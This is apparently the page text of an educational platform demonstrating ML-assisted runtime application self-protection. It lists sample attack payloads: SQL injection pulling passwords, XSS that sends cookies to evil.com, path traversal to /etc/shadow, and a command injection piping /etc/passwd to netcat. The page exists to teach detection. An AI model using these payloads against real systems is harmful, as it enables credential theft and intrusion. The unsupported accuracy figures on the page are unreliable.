Welcome to RASP-Lab

Educational platform demonstrating Runtime Application Self-Protection powered by ML

RASP works inside the application to provide deep visibility and precise threat detection. Unlike traditional firewalls, it intercepts inputs right before execution, utilizing an ensemble of rule-based CVSS heuristics and intelligent linear regressions.

Coverage

99.9%

Latency

<10ms

False Positives

<0.1%

How it works:

  • Rule Baseline: Payload is checked against predefined CVSS patterns (SQL, LFI, RFI, CMD).
  • Feature Extraction: Length, obfuscation, script tags, and keywords are fed asynchronously to the Python Flask API.
  • Ensemble Decision: Final Score = Rule Score + (ML Probability * 100) is calculated.

SQL Injection Detection

Defending against query manipulation and unauthorized extraction

SQL Injection (CVSS 9.0) manipulates application inputs to interface maliciously with underlying database syntax. The RASP system identifies nested constraints like UNION SELECT or Boolean-based logic injections.

Types of SQLi

UNION-Based
UNION SELECT NULL, username, password FROM users
Boolean-Based Blind
id=1' AND '1'='1 (true) / '1'='2 (false)
Time-Based
id=1; WAITFOR DELAY '0:0:5'--

Cross-Site Scripting (XSS)

Blocking malicious script execution on client systems

XSS attacks attempt to inject <script> tags, DOM events (like onload), or obfuscated encoded javascript logic. RASP prevents these by detecting anomalies natively before reflection.

Attack Variants

Stored / Reflected Tags
<script>alert('XSS')</script>
Event Obfuscation
<img src=x onerror="fetch('http://evil.com/cookie='+document.cookie)">
Encoded Bypasses
eval(String.fromCharCode(97,108,101,114,116...))

HTTP Anomaly & Command Analysis

Interrogating Path Traversal, File Inclusion, JSON, and System execution

Modern applications encounter deeply nested API attacks. From Local/Remote file inclusions fetching /etc/passwd to direct OS process bindings via ; or && syntax execution patterns.

Deep Threat Vectors

Path Traversal & LFI
../../../../etc/shadow
Remote File Inclusion (RFI)
http://malicious.com/shell.php
Command Injection
; ls -la && cat /etc/passwd | nc 192.168.0.1 4444
NoSQL / JSON Injection
{"password": {"$ne": null}}

The ML Pipeline

Scikit-Learn Logistic Regression & Flask Backend

Behind the scenes, we use an advanced Logistic Regression model serialized to a .pkl file. The engine processes 5 key features exported from the initial request string:

  • Payload Length - Extremely long queries trigger anomalies
  • Special Character Count: High density indicates malicious obfuscation boundaries.
  • SQL Keyword Matching: e.g., SELECT, FROM, WHERE, OR.
  • Script Tag Checks: JavaScript anomalies like javascript: or <script>
  • URL Encoding Flags: Double and hidden encodings %00, %22...
